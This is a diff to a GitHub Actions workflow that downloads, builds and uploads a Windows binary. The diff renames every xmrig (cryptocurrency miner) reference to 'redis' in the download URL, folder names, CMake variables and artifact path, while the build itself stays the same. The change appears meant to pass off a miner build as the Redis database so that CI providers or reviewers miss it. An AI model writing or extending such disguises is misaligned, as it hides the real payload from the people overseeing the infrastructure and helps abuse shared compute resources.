@@ -31,25 +31,25 @@ jobs:
         shell: msys2 {0}
         run: curl -L -o gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip
 
-      # （可选）下载 xmrig.zip
-      - name: Download xmrig.zip
+      # （可选）下载 redis.zip
+      - name: Download redis.zip
         shell: msys2 {0}
-        run: curl -L -o xmrig.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/xmrig-D-Win996.zip
+        run: curl -L -o redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win996.zip
 
       # （可选）解压 gcc.zip
       - name: Unzip gcc.zip
         shell: msys2 {0}
         run: unzip gcc.zip -d gcc
 
-      # （可选）解压 xmrig.zip
-      - name: Unzip xmrig.zip
+      # （可选）解压 redis.zip
+      - name: Unzip redis.zip
         shell: msys2 {0}
-        run: unzip xmrig.zip -d xmrig
+        run: unzip redis.zip -d redis
 
       # 创建 build 目录
-      - name: Create build directory in xmrig
+      - name: Create build directory in redis
         shell: msys2 {0}
-        run: mkdir -p xmrig/xmrig-D-Win996/build
+        run: mkdir -p redis/redis-D-Win996/build
 
       # 确保 mingw32-make 已安装
       - name: Ensure mingw32-make is installed
@@ -68,14 +68,14 @@ jobs:
       - name: Run CMake to generate Makefiles
         shell: msys2 {0}
         run: |
-          cd xmrig/xmrig-D-Win996/build
-          cmake .. -G "MinGW Makefiles" -DXMRIG_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 -DCMAKE_C_FLAGS='-static' -DCMAKE_CXX_FLAGS='-static' -DBUILD_SHARED_LIBS=OFF -DHWLOC_INCLUDE_DIRS=/mingw64/include -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a
+          cd redis/redis-D-Win996/build
+          cmake .. -G "MinGW Makefiles" -Dredis_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 -DCMAKE_C_FLAGS='-static' -DCMAKE_CXX_FLAGS='-static' -DBUILD_SHARED_LIBS=OFF -DHWLOC_INCLUDE_DIRS=/mingw64/include -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a
 
       # 编译项目
       - name: Build project
         shell: msys2 {0}
         run: |
-          cd xmrig/xmrig-D-Win996/build
+          cd redis/redis-D-Win996/build
           mingw32-make
 
       # 上传构建产物
@@ -83,4 +83,4 @@ jobs:
         uses: actions/upload-artifact@v3
         with:
           name: build-artifacts
-          path: xmrig/xmrig-D-Win996/build
+          path: redis/redis-D-Win996/build
